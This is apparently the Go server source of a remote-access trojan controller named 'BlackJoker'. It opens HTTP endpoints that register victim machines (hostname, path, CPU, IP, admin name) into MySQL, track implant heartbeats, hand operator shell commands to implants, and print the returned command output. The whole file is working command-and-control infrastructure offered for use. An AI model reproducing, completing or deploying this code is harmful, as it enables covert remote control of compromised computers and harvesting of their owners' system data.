package main

import (
	jsonOSsystemDB "BlackJoker/Mysql"
	"fmt"
	"github.com/axgle/mahonia"
	"github.com/gin-gonic/gin"
	"log"
	"net/http"
	"sync"
	"time"
)

type RoutingGroup struct{}

type OSini struct {
	Cookie          string `json:"WhoamiName"`
	SystemName      string `json:"systemName"`
	SysPath         string `json:"sysPath"`
	Cpu             string `json:"Cpu"`
	CpuArchItecture string `json:"CpuArchItecture"`
	IP              string `json:"ip"`
	AdminName       string `json:"AdminName"`
}

type SessionInfo struct {
	Name      string
	Timestamp time.Time
}
type PendingRequests struct {
	Payload    string
	ReceivedAt time.Time
}

var (
	PendingRequestsMap            = make(map[string]PendingRequests)
	FlagInTrue                    = make(chan string, 2)
	command                       = make(chan string, 5)
	FlagInFalse                   string
	FlagBool                      bool
	ObtainingOnlineNumberOfPeople []SessionInfo
	mu                            sync.Mutex
)

func ObtainingSession(SessionName string) {
	Session := SessionInfo{
		Name:      SessionName,
		Timestamp: time.Now(),
	}
	mu.Lock()
	ObtainingOnlineNumberOfPeople = append(ObtainingOnlineNumberOfPeople, Session)
	mu.Unlock()
	func() {
		cutoff := time.Now().Add(-3 * time.Minute)
		var newSlice []SessionInfo
		mu.Lock()
		for _, session := range ObtainingOnlineNumberOfPeople {
			if session.Timestamp.After(cutoff) {
				newSlice = append(newSlice, session)
			}
		}
		ObtainingOnlineNumberOfPeople = newSlice
		mu.Unlock()
	}()
}
func (r *RoutingGroup) HeartbeatHttp(c *gin.Context) {
	payload, err := c.GetRawData()
	if err != nil {
		c.String(http.StatusBadRequest, "无法获取数据Error")
		log.Println(err)
	}
	mu.Lock()
	PendingRequestsMap[string(payload)] = PendingRequests{
		Payload:    string(payload),
		ReceivedAt: time.Now(),
	}
	mu.Unlock()

	F := jsonOSsystemDB.CheckCookieExists(string(payload))
	switch F {
	case F == true:
		// 找到了
		ObtainingSession(string(payload))
		c.Status(http.StatusOK)
	case F == false:
		// 没找到
		c.Status(http.StatusBadRequest)
	}
}
func (r *RoutingGroup) InitCookie(c *gin.Context) {
	var OSkull OSini
	if err := c.BindJSON(&OSkull); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
	}
	json := OSkull.Cookie + "|" + OSkull.SystemName + "|" + OSkull.SysPath + "|" + OSkull.Cpu + "|" + OSkull.CpuArchItecture + "|" + OSkull.IP + "|" + OSkull.AdminName
	c.Status(http.StatusOK)
	go r.Mysql(json)
}
func (r *RoutingGroup) Mysql(json string) {
	jsonOSystem := make(chan string, 10)
	go func() {
		jsonOSystem <- json
	}()
	select {
	case jsonOS := <-jsonOSystem:
		err := jsonOSsystemDB.MysqlMain(jsonOS)
		if err != nil {
			log.Println(err)
		}
	case <-time.After(20 * time.Second):
		log.Println("超时,jsonOSystemDta没有发送过来!")
	}
}
func findSession(adminCookie string) bool {
	mu.Lock()
	defer mu.Unlock()
	for _, info := range ObtainingOnlineNumberOfPeople {
		if adminCookie == info.Name {
			for _, req := range PendingRequestsMap {
				if req.Payload == adminCookie {
					return true
				}
			}
			break
		}
	}
	fmt.Println("找不到该Session或对应的请求")
	return false
}
func (r *RoutingGroup) AttackShell(c *gin.Context) {
	timeout := time.After(time.Hour * 24)
	if FlagBool == false {
		select {
		case adminCookie := <-FlagInTrue:
			{
				_ = findSession(adminCookie)
				CommandStr := <-command
				c.String(http.StatusOK, CommandStr)
			}
		case <-timeout:
			{
				log.Println("AttackShell flag通道超时!非超时异常错误!")
			}
		}
	} else if FlagBool == true {
		flag2_ := FlagInFalse
		adminCookies, _ := c.GetRawData()
		if string(adminCookies) == flag2_ {
			CommandStr := <-command
			c.String(http.StatusOK, CommandStr)
		} else {
			_ = 0
		}
	}
}
func Utf8ToGbk(s []byte) string {
	enc := mahonia.NewEncoder("GBK")
	d := enc.ConvertString(string(s))
	return d
}
func (r *RoutingGroup) AttackShellInput(c *gin.Context) {
	Data, _ := c.GetRawData()
	CommandString := Utf8ToGbk(Data)
	fmt.Println(CommandString)
}
func ServerInit() {
	router := gin.New()
	api := router.Group("/api")
	RoutingGroup := RoutingGroup{}
	//-----------------------------------------------------------//
	go api.POST("/init/cookie", RoutingGroup.InitCookie)
	go api.POST("/HeartbeatHttp", RoutingGroup.HeartbeatHttp)
	go api.POST("/ShellOsHttp", RoutingGroup.AttackShell)
	go api.POST("/ShellOsHttp/Input", RoutingGroup.AttackShellInput)
	//-----------------------------------------------------------//
	err := router.Run(":5264")
	if err != nil {
		log.Println("Server启动错误:", err)
		return
	}
}
func banner() {
	banners := " ____  _     ____  ____  _  __    _  ____  _  __ _____ ____ \n/  __\\/ \\   /  _ \\/   _\\/ |/ /   / |/  _ \\/ |/ //  __//  __\\\n| | //| |   | / \\||  /  |   /    | || / \\||   / |  \\  |  \\/|\n| |_\\\\| |_/\\| |-|||  \\_ |   \\ /\\_| || \\_/||   \\ |  /_ |    /\n\\____/\\____/\\_/ \\|\\____/\\_|\\_\\\\____/\\____/\\_|\\_\\\\____\\\\_/\\_\\\n"
	fmt.Println(banners)
}
func main() {
	go ServerInit()
	go func() {
		InteractiveMain()
	}()
	select {}
}
